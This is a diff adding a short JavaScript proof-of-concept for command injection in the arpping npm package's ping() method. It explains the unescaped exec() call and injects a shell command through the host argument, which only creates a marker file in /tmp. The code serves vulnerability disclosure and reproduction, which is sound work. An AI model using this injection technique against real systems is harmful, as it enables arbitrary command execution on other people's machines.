@@ -1,0 +1,26 @@
+```javascript
+// Exploit for command injection in arpping's Arpping.prototype.ping()
+// Root cause: exec('ping ' + flag + ' ' + this.timeout + ' ' + host, ...)
+// concatenates the caller-supplied host string directly into a shell
+// command with no sanitization/escaping, so shell metacharacters in the
+// "host" value break out and run arbitrary commands.
+
+const Arpping = require("./node_modules/arpping");
+
+const arpping = new Arpping();
+
+// Malicious "host" containing a shell command injection payload.
+const payload = "127.0.0.1; touch /tmp/arpping_pwned; echo INJECTED";
+
+arpping.ping([payload])
+    .then((result) => {
+        console.log("ping() result:", result);
+        const fs = require("fs");
+        if (fs.existsSync("/tmp/arpping_pwned")) {
+            console.log("EXPLOIT SUCCESS: /tmp/arpping_pwned was created via command injection");
+        } else {
+            console.log("Exploit did not create marker file");
+        }
+    })
+    .catch((err) => console.error("Error:", err));
+```
